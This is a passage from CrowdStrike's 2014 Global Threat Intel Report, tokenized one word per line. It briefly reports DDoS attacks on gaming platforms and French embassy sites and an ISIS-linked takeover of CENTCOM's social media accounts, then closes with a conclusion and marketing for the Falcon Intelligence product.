CrowdStrike
Intelligence
is
also
aware
of
DDOS
threats
against
other
gaming
platforms
including
Valve
Software
,
which
appeared
to
be
targeted
by
a
DNS
amplification
DDOS
attack
that
is
similar
to
previous
LizardSquad
activity
.

Malicious
actors
have
already
engaged
in
disruptive
campaigns
in
early
2015
.

Following
the
January
terrorist
attacks
in
France
,
a
group
of
Islamist
hackers
known
as
Fallaga
conducted
DDOS
attacks
against
servers
hosting
websites
for
French
foreign
embassies
.

Soon
after
,
another
Islamist
group
identifying
with
ISIS
took
control
of
the
Twitter
and
YouTube
accounts
for
U.S.

Central
Command
and
posted
a
number
of
messages
threatening
U.S.

troops
and
their
families
.

Organizations
in
all
sectors
should
be
aware
of
,
and
prepared
for
,
destructive
and
disruptive
attacks
.

These
operations
are
often
motivated
by
a
specific
grievance
,
but
sometimes
no
clear
motivation
can
be
established
.

Continuous
monitoring
for
publicized
threats
against
an
organization
,
or
for
potential
areas
of
controversy
that
could
motivate
malicious
activity
,
is
vital
to
detect
and
prepare
for
these
types
of
attacks
.

The
question
now
is
:
How
do
you
incorporate
intelligence
into
your
daily
defenses
and
prioritize
resources
based
on
risk
to
your
business
?
Conclusion
In
the
course
of
reviewing
2014
,
there
were
so
many
interesting
events
,
adversaries
,
and
innovations
that
selecting
examples
for
this
report
was
an
incredible
challenge
.

The
CrowdStrike
Intelligence
team
spent
much
time
narrowing
the
scope
of
topics
covered
herein
.

The
adversaries
in
2014
proved
,
if
nothing
else
,
to
be
dynamic
,
persistent
,
and
innovative
.

Defenders
must
be
inventive
,
diligent
,
and
decisive
in
their
efforts
to
defend
the
enterprise
from
these
attackers
.

2015
will
be
a
continuation
of
the
cat
-
and
-
mouse
game
that
is
played
between
the
adversary
and
the
defender
.

Adversaries
across
the
motivational
spectrum
will
continue
to
evolve
their
tactics
in
order
to
achieve
their
objectives
.

Although
tactics
may
evolve
,
network
defenders
will
be
able
to
have
success
against
the
adversary
so
long
as
they
are
well
prepared
.

Intelligence
will
provide
the
decisive
advantage
to
both
sides
,
and
having
a
good
defense
will
be
predicated
on
having
an
informed
,
intelligent
defensive
team
.

The
incorporation
of
intelligence
into
the
daily
defense
of
the
enterprise
will
continue
to
be
paramount
and
products
,
services
,
and
solution
providers
will
need
to
use
this
intelligence
to
stay
ahead
of
the
adversary
.

At
CrowdStrike
,
intelligence
powers
everything
we
do
,
and
as
2015
unfolds
,
organizations
using
intelligence
will
be
better
prepared
to
detect
,
deter
,
and
defend
against
their
adversaries
.

Crowdstrike
Falcon
Intelligence
CrowdStrike
Falcon
Intelligence
portal
provides
enterprises
with
strategic
,
customized
,
and
actionable
intelligence
.

Falcon
Intelligence
enables
organizations
to
prioritize
resources
by
determining
targeted
versus
commodity
attacks
,
saving
time
and
focusing
resources
on
critical
threats
.

With
unprecedented
insight
into
adversary
Tactics
,
Techniques
,
and
Procedures
(
TTPs
)
and
multi
-
source
information
channels
,
analysts
can
identify
pending
attacks
and
automatically
feed
threat
intelligence
via
API
to
SIEM
and
third
-
party
security
tools
.

Access
to
CrowdStrike
Falcon
Intelligence
is
geared
toward
all
levels
of
an
organization
,
from
the
executive
who
needs
to
understand
the
business
threat
and
strategic
business
impact
,
to
the
front-
line
security
professional
struggling
to
fight
through
an
adversary
's
attack
against
the
enterprise
.

CrowdStrike
Falcon
Intelligence
is
a
web
-
based
intelligence
subscription
that
includes
full
access
to
a
variety
of
feature
sets
,
including
.

Let
us
show
you
how
CrowdStrike
can
help
you
understand
your
adversary
and
better
protect
your
network
in
2015
!
Contact
sales@crowdstrike.com
to
discuss
your
specific
needs
.

888
-
512
-
8906
www.crowdstrike.com
two
thousand
fourteen
CrowdStrike
Global
Threat
Intel
Report
About
CrowdStrike
CrowdStrike™
is
a
leading
provider
of
next-
generation
endpoint
protection
,
threat
intelligence
,
and
services
.

CrowdStrike
Falcon
enables
customers
to
prevent
damage
from
targeted
attacks
,
detect
and
attribute
advanced
malware
and
adversary
activity
in
real
time
,
and
effortlessly
search
all
endpoints
,
reducing
overall
incident
response
time
.

CrowdStrike
customers
include
some
of
the
largest
blue
chip
companies
in
the
financial
services
,
energy
,
oil
&
gas
,
telecommunications
,
retail
,
and
technology
sectors
,
along
with
some
of
the
largest
and
most
sophisticated
government
agencies
worldwide
.

To
learn
more
,
please
visit
www.crowdstrike.com

